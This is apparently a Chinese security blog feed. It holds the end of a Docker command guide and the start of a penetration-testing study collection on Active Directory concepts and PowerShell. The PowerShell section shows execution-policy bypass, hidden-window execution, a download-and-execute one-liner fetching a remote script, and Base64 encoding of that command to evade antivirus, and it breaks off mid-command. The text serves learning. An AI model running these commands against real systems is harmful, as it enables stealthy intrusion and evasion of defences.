设置国内镜像源</h2><pre class="line-numbers language-none"><code class="language-none">vi &#x2F;etc&#x2F;docker&#x2F;daemon.json&#123;    &quot;registry-mirrors&quot;: [&quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;]&#125;systemctl restart docker.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>国内加速地址如下：</p><pre class="line-numbers language-none"><code class="language-none">Docker中国区官方镜像https:&#x2F;&#x2F;registry.docker-cn.com网易http:&#x2F;&#x2F;hub-mirror.c.163.com中国科技大学https:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn阿里云容器  服务https:&#x2F;&#x2F;cr.console.aliyun.com&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><h2 id="1、搜索镜像"><a href="#1、搜索镜像" class="headerlink" title="1、搜索镜像"></a>1、搜索镜像</h2><pre class="line-numbers language-none"><code class="language-none">docker search centos<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、拉取镜像"><a href="#2、拉取镜像" class="headerlink" title="2、拉取镜像"></a>2、拉取镜像</h2><pre class="line-numbers language-none"><code class="language-none">docker pull centos<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、查看镜像文件"><a href="#3、查看镜像文件" class="headerlink" title="3、查看镜像文件"></a>3、查看镜像文件</h2><pre class="line-numbers language-none"><code class="language-none">docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看镜像层级关系</p><pre class="line-numbers language-none"><code class="language-none">docker images tree# 以前这个命令是：docker images --tree<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、查看docker所有进程"><a href="#4、查看docker所有进程" class="headerlink" title="4、查看docker所有进程"></a>4、查看docker所有进程</h2><pre class="line-numbers language-none"><code class="language-none">docker ps -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5、开启容器"><a href="#5、开启容器" class="headerlink" title="5、开启容器"></a>5、开启容器</h2><p>开启指定容器，这里的容器名为 Web</p><pre class="line-numbers language-none"><code class="language-none">docker start web<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动所有容器</p><pre class="line-numbers language-none"><code class="language-none">docker start $(docker ps -aq)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6、进入正在运行的容器"><a href="#6、进入正在运行的容器" class="headerlink" title="6、进入正在运行的容器"></a>6、进入正在运行的容器</h2><p>docker 创建的</p><pre class="line-numbers language-none"><code class="language-none">docker attach web<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>docker-compose 创建的</p><p>container_name 需要在 docker-compose.yml 文件中查看</p><pre class="line-numbers language-none"><code class="language-none">docker-compose exec container_name bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="7、指定端口启动创建进入容器"><a href="#7、指定端口启动创建进入容器" class="headerlink" title="7、指定端口启动创建进入容器"></a>7、指定端口启动创建进入容器</h2><pre class="line-numbers language-none"><code class="language-none">docker run -p 9992:80 -p 8882:8888 -it ubuntu &#x2F;bin&#x2F;bashdocker run --name web1 -p 9991:80 -p 8881:8888 -it centos &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8、导出导入镜像"><a href="#8、导出导入镜像" class="headerlink" title="8、导出导入镜像"></a>8、导出导入镜像</h2><p>export\import 导入导出</p><pre class="line-numbers language-none"><code class="language-none">docker export web &gt; &#x2F;home&#x2F;docker_web.tardocker import &#x2F;home&#x2F;docker_web.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>save\load 导入导出</p><pre class="line-numbers language-none"><code class="language-none">docker save 9610cfc68e8d &gt; &#x2F;home&#x2F;docker_web.tardocker load &lt; &#x2F;home&#x2F;docker_web.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>export\import 与 save\load 的区别：</p><ul><li><p>export\import 导出的镜像文件大小要小于 save\load 导出的镜像</p></li><li><p>export\import 是根据容器拿到的镜像，再导入时会丢失镜像所有的历史，所以无法进行回滚操作；而 save\load 的镜像，没有丢失镜像的历史，可以回滚到之前的层。</p></li></ul><h2 id="9、修改正在运行的容器端口映射"><a href="#9、修改正在运行的容器端口映射" class="headerlink" title="9、修改正在运行的容器端口映射"></a>9、修改正在运行的容器端口映射</h2><p>a、停止容器</p><p>b、 停止 docker 服务(systemctl stop docker) </p><p>c、 修改这个容器的 hostconfig.json 文件中的端口（原帖有人提到，如果 config.v2.json 里面也记录了端口，也要修改） </p><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;var&#x2F;lib&#x2F;docker&#x2F;3b6ef264a040* # 这里是 CONTAINER IDvi hostconfig.json# 如果之前没有端口映射, 应该有这样的一段:&quot;PortBindings&quot;:&#123;&#125;# 增加一个映射, 这样写:&quot;PortBindings&quot;:&#123;&quot;3306&#x2F;tcp&quot;:[&#123;&quot;HostIp&quot;:&quot;&quot;,&quot;HostPort&quot;:&quot;3307&quot;&#125;]&#125;# 前一个数字是容器端口, 后一个是宿主机端口# 而修改现有端口映射更简单, 把端口号改掉就行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>d、启动docker服务(systemctl start docker)</p><p>e、启动容器</p><h2 id="10、文件传输"><a href="#10、文件传输" class="headerlink" title="10、文件传输"></a>10、文件传输</h2><pre class="line-numbers language-none"><code class="language-none">docker cp 本地文件路径 ID全称:容器路径# 或者docker cp ID全称:容器文件路径 本地路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="11、后台运行docker"><a href="#11、后台运行docker" class="headerlink" title="11、后台运行docker"></a>11、后台运行docker</h2><p>启动全新的容器，该命令会在后台运行容器，并返回容器ID</p><pre class="line-numbers language-none"><code class="language-none">docker run -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于现有的容器</p><pre class="line-numbers language-none"><code class="language-none">ctrl+P+Q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x03-卸载"><a href="#0x03-卸载" class="headerlink" title="0x03 卸载"></a>0x03 卸载</h1><h2 id="1、停止容器"><a href="#1、停止容器" class="headerlink" title="1、停止容器"></a>1、停止容器</h2><p>停止指定容器</p><pre class="line-numbers language-none"><code class="language-none">docker stop web<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>停止所有容器</p><pre class="line-numbers language-none"><code class="language-none">docker stop $(docker ps -aq)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、删除容器和镜像"><a href="#2、删除容器和镜像" class="headerlink" title="2、删除容器和镜像"></a>2、删除容器和镜像</h2><p>删除指定容器</p><pre class="line-numbers language-none"><code class="language-none">docker container rm d383057928b4# 指定容器 ID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有已退出的容器</p><pre class="line-numbers language-none"><code class="language-none">docker rm $(docker ps -q -f status&#x3D;exited)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有已停止的容器</p><pre class="line-numbers language-none"><code class="language-none">docker rm $(docker ps -a -q)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有正在运行和已停止的容器</p><pre class="line-numbers language-none"><code class="language-none">docker stop $(docker ps -a -q)docker rm $(docker ps -a -q)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有容器，没有任何标准</p><pre class="line-numbers language-none"><code class="language-none">docker container rm $(docker container ps -aq)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Docker 资源清理</p><pre class="line-numbers language-none"><code class="language-none">docker container prune# 删除所有退出状态的容器docker image prune# 删除 dangling 或所有未被使用的镜像docker network prune# 删除所有未使用的网络docker volume prune# 删除未被使用的数据卷docker system prune# 删除已停止的容器、dangling 镜像、未被容器引用的 network 和构建过程中的 cache，安全起见，这个命令默认不会删除那些未被任何容器引用的数据卷，如果需要同时删除这些数据卷，你需要显式的指定 --volumns 参数docker system prune --all --force --volumns # 这次不仅会删除数据卷，而且连确认的过程都没有了！注意，使用 --all 参数后会删除所有未被引用的镜像而不仅仅是 dangling 镜像<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>删除所有镜像</p><pre class="line-numbers language-none"><code class="language-none">docker rmi $(docker images -q)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、卸载Docker"><a href="#3、卸载Docker" class="headerlink" title="3、卸载Docker"></a>3、卸载Docker</h2><pre class="line-numbers language-none"><code class="language-none">yum list installed | grep dockeryum -y remove docker.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4、卸载Docker-compose"><a href="#4、卸载Docker-compose" class="headerlink" title="4、卸载Docker-compose"></a>4、卸载Docker-compose</h2><pre class="line-numbers language-none"><code class="language-none">rm &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>参考地址：</p><p><a href="https://blog.csdn.net/a906998248/article/details/46236687">https://blog.csdn.net/a906998248/article/details/46236687</a></p><p><a href="https://blog.csdn.net/wesleyflagon/article/details/78961990">https://blog.csdn.net/wesleyflagon/article/details/78961990</a></p><p>原文链接：</p><p><a href="https://teamssix.com/211028-204606.html">https://teamssix.com/211028-204606.html</a></p><p>更多信息欢迎关注微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 经验总结 </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【建议收藏】内网学习笔记合集</title>
      <link href="//211027-163641.html"/>
      <url>//211027-163641.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>自 2020 年 11 月份至 2021 年 10 月份，在这近一年的时间里，笔者更新了自己在学习内网过程中的 30 余篇笔记，并将笔记同步更新到了自己的公众号、博客、CSDN 等平台，特在此整理成合集发布出来。</p><p>建议收藏本文，随时翻阅查看。</p><blockquote><p>本文首发在我的个人公众号和个人博客，欢迎关注我的公众号：TeamsSix，我的博客：<a href="https://teamssix.com/">teamssix.com</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p><h1 id="0x01-内网常见名词解释"><a href="#0x01-内网常见名词解释" class="headerlink" title="0x01 内网常见名词解释"></a>0x01 内网常见名词解释</h1><h2 id="1、工作组"><a href="#1、工作组" class="headerlink" title="1、工作组"></a>1、工作组</h2><p><strong>工作组</strong> <code>Work Group</code> 是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p><p>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</p><p>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p><p>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。</p><p>所以对于管理者而言，工作组的管理方式有时会不太便于管理，这时候就需要了解域的概念了。</p><h2 id="2、域"><a href="#2、域" class="headerlink" title="2、域"></a>2、域</h2><h3 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域 Domain"></a>域 <code>Domain</code></h3><p> 可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。</p><p>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p><h3 id="域控制器-Domain-Controller"><a href="#域控制器-Domain-Controller" class="headerlink" title="域控制器 Domain Controller"></a>域控制器 <code>Domain Controller</code></h3><p>简写为 <code>DC</code>，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p><p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。</p><p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。</p><p>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p><h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p><p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。</p><p>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p><p>多个域树可以组成一个域林。</p><h3 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h3><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p><p>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道Kerberos信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.</p><p>比如benet.com.cn,则可以创建同属与一个林的accp.com.cn,他们就在同一个域林里.</p><p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p><p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/%E5%9F%9F%E6%9E%97.png" alt="域林"></p><h2 id="3、活动目录"><a href="#3、活动目录" class="headerlink" title="3、活动目录"></a>3、活动目录</h2><p><strong>活动目录</strong> <code>Active Directory</code> ，简写为 <code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。</p><p>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。</p><p>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p><h2 id="4、DMZ"><a href="#4、DMZ" class="headerlink" title="4、DMZ"></a>4、DMZ</h2><p>DMZ <code>demilitarized zone</code> ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p><p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/f603918fa0ec08fadb43804a59ee3d6d54fbda98.jfif"></p><h2 id="5、域内的各种权限"><a href="#5、域内的各种权限" class="headerlink" title="5、域内的各种权限"></a>5、域内的各种权限</h2><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p><p><strong>域本地组</strong></p><p>成员范围：所有的域；使用范围：自己所在的域</p><p><strong>全局组</strong></p><p>成员范围：自己所在的域；使用范围：所有的域</p><p><strong>通用组</strong></p><p>成员范围：所有的域；使用范围：所有的域</p><p><strong>A-G-DL-P 策略</strong></p><p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><ul><li>A 表示用户账号</li><li>G 表示全局组</li><li>U 表示通用组</li><li>DL 表示域本地组</li><li>P 表示资源权限</li></ul><h1 id="0x02-PowerShell"><a href="#0x02-PowerShell" class="headerlink" title="0x02 PowerShell"></a>0x02 PowerShell</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 PowerShell 还能做很多 cmd 不能做的事情。</p><p>PowerShell 内置在 Windows 7、Windows Server 2008 R2 及更高版本的 Windows 系统中，同时 PowerShell 是构建在 .NET 平台上的，所有命令传递的都是 .NET 对象。</p><p>PowerShell 有如下特点：</p><ul><li>Windows 7 以上的操作系统默认安装</li><li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li><li>可以从另一个系统中下载 PowerShell 脚本并执行</li><li>目前很多工具都是基于 PowerShell 开发的</li><li>很多安全软件检测不到 PowerShell 的活动</li><li>cmd 通常会被阻止运行，但是 PowerShell 不会</li><li>可以用来管理活动目录</li></ul><p>可输入 Get-Host 或者 $PSVersionTable 查看 PowerShell 版本：</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; Get-HostName             : ConsoleHostVersion          : 5.1.18362.1171InstanceId       : a0a6f8f2-f86a-477f-bf4b-b94b452bee3cUI               : System.Management.Automation.Internal.Host.InternalHostUserInterfaceCurrentCulture   : zh-CNCurrentUICulture : zh-CNPrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxyDebuggerEnabled  : TrueIsRunspacePushed : FalseRunspace         : System.Management.Automation.Runspaces.LocalRunspace<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; $PSVersionTableName                           Value----                           -----PSVersion                      5.1.18362.1171PSEdition                      DesktopPSCompatibleVersions           &#123;1.0, 2.0, 3.0, 4.0...&#125;BuildVersion                   10.0.18362.1171CLRVersion                     4.0.30319.42000WSManStackVersion              3.0PSRemotingProtocolVersion      2.3SerializationVersion           1.1.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Windows 操作系统对应的 PowerShell 版本信息：</p><p>1.0        windows server 2008</p><p>2.0        windows server 2008 r2、windows 7</p><p>3.0        windows server 2012、windows 8</p><p>4.0        windows server 2012 r2、windows 8.1</p><p>5.0        windows 10</p><p>5.1        windows server 2016</p><h2 id="2、基本概念"><a href="#2、基本概念" class="headerlink" title="2、基本概念"></a>2、基本概念</h2><h3 id="ps1-文件"><a href="#ps1-文件" class="headerlink" title="ps1 文件"></a>ps1 文件</h3><p>ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件。</p><h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式<code>Restricted</code>。</p><p>使用 <code>Get-ExecutionPolicy</code>命令查看当前执行策略</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; Get-ExecutionPolicyRestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行策略有以下几种：</p><p><strong>Restricted</strong>：不能运行脚本</p><p><strong>RemoteSigned</strong>：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p><p><strong>AllSigned</strong>：仅当脚本由受信任的发布者签名才能运行。 </p><p><strong>Unrestricted</strong>：脚本执行不受限制，不管来自哪里，也不管它们是否有签名。</p><p>使用<code>Set-ExecutionPolicy &lt;policy name&gt;</code>设置执行策略，该命令需要管理员权限</p><pre class="line-numbers language-none"><code class="language-none">PS C:\WINDOWS\system32&gt; Set-ExecutionPolicy Unrestricted执行策略更改执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170 中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): APS C:\WINDOWS\system32&gt; Get-ExecutionPolicyUnrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>PowerShell 运行脚本的方式和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行，具体如下：</p> <pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; C:\t.ps1hello TeamsSixPS C:\Users\teamssix&gt; cd C:\PS C:\&gt; .\t.ps1hello TeamsSix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里不禁想吐槽一下，在看百度百科的时候关于 PowerShell 运行脚本的描述是这样的：“假设你要运行一个名为a.ps1的脚本，你可以键入 C:\Scripts\aps1，最大的例外是，如果 PowerShell 脚本文件刚好位于你的系统目录中，那么你可以直接在命令提示符命令提示符后键入脚本文件名即可运行”</p><p>这里的“系统目录”是指的啥目录？C:\还是C:\windows\system目录，“最大的例外”又是什么鬼，讲道理读起来有一种机翻的感觉。</p></blockquote><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>PowerShell 中的管道类似于 linux 中的管道，都是将前一个命令的输出作为另一个命令的输入，两个命令之间使用 “|” 进行连接。</p><p>例如，在 PowerShell 中获取进程信息并以程序 ID 进行排序</p><pre class="line-numbers language-none"><code class="language-none">PS C:\&gt; Get-Process | Sort-Object IDHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName-------  ------    -----      -----     ------     --  -- -----------      0       0       60          8                 0   0 Idle   3038       0      208       4760                 4   0 System      0      12     7732      81344                88   0 Registry     53       3     1160        752               368   0 smss    256      10     2468       7424               424   0 svchost    662      21     1788       4668               504   0 csrss    160      11     1364       5660               580   0 wininit    653      27    18592     177580               588   1 csrss   1219      67    59660         52       2.59    600   1 WinStore.App    278      14     3108      15656               684   1 winlogon    687      11     5420       9432               724   0 services<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、一些命令"><a href="#3、一些命令" class="headerlink" title="3、一些命令"></a>3、一些命令</h2><blockquote><p>-NoLogo：启动不显示版权标志的PowerShell</p><p>-WindowStyle Hidden (-W Hidden)：隐藏窗口</p><p>-NoProfile (-NoP)：不加载当前用户的配置文件</p><p>–Enc：执行 base64 编码后的 powershell 脚本字符串</p><p>-ExecutionPolicy Bypass (-Exec Bypass) ：绕过执行安全策略</p><p>-Noexit：执行后不退出Shell，这在使用键盘记录等脚本时非常重要</p><p>-NonInteractive (-Nonl)：非交互模式，PowerShell 不为用户提供交互的提示</p></blockquote><p>在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式，如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等。PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls 。</p><h3 id="文件操作类命令"><a href="#文件操作类命令" class="headerlink" title="文件操作类命令"></a>文件操作类命令</h3><pre class="line-numbers language-none"><code class="language-none">新建目录test：New-Item test -ItemType directory删除目录test：Remove-Item test新建文件test.txt：New-Item test.txt -ItemType file新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value &quot;hello&quot;删除文件test.txt：Remove-Item test.txt查看文件test.txt内容：Get-Content  test.txt设置文件test.txt内容t：Set-Content  test.txt  -Value &quot;hello&quot;给文件test.txt追加内容：Add-Content test.txt  -Value &quot;,word!&quot;清除文件test.txt内容：Clear-Content test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="绕过本地权限并执行"><a href="#绕过本地权限并执行" class="headerlink" title="绕过本地权限并执行"></a>绕过本地权限并执行</h3><p>上面说到了默认情况下 PowerShell 的执行策略是受限模式<code>Restricted</code>，这就导致了在渗透测试过程中我们需要采用一些方法绕过这个策略，从而执行我们的脚本文件。</p><p>先来看看默认受限模式下执行脚本的情况</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; powerShell.exe Get-ExecutionPolicyRestrictedPS C:\Users\teamssix&gt; PowerShell.exe -File t.ps1无法加载文件 C:\Users\teamssix\t.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170 中的 about_Execution_Policies。    + CategoryInfo          : SecurityError: (:) []，ParentContainsErrorRecordException    + FullyQualifiedErrorId : UnauthorizedAccess<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里系统会提示在此系统上禁止运行脚本，但加上 <code>-ExecutionPolicy Bypass</code>即可绕过这个限制</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; cat .\t.ps1echo &quot;Hello TeamsSix&quot;PS C:\Users\teamssix&gt; PowerShell.exe -ExecutionPolicy Bypass -File t.ps1hello TeamsSix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="绕过本地权限并隐藏执行"><a href="#绕过本地权限并隐藏执行" class="headerlink" title="绕过本地权限并隐藏执行"></a>绕过本地权限并隐藏执行</h3><p>加入<code>-WindowStyle Hidden -NoLogo -NonInteractive -NoProfile</code> 即可隐藏执行。</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File t.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="下载远程脚本绕过权限并隐藏执行"><a href="#下载远程脚本绕过权限并隐藏执行" class="headerlink" title="下载远程脚本绕过权限并隐藏执行"></a>下载远程脚本绕过权限并隐藏执行</h3><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者简写</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="利用-Base64-对命令进行编码"><a href="#利用-Base64-对命令进行编码" class="headerlink" title="利用 Base64 对命令进行编码"></a>利用 Base64 对命令进行编码</h3><p>使用 Base64 进行编码主要是为了混淆代码以避免被杀毒软件查杀，经过尝试这里直接使用 Base64 编码是不行的，可以使用 Github 上的一个编码工具，工具下载地址：</p><p><a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py</a></p><p>下载好后，需要先将要执行的命令保存到文本文件中，这里保存到了 tmp.txt 文本中，之后执行 <code>python ps_encoder.py -s tmp.txt</code> 即可</p><pre class="line-numbers language-none"><code class="language-none">&gt;cat tmp.txtIEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&gt;python ps_encoder.py -s tmp.txtSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 –Enc 指定 Base64 编码内容</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -Enc 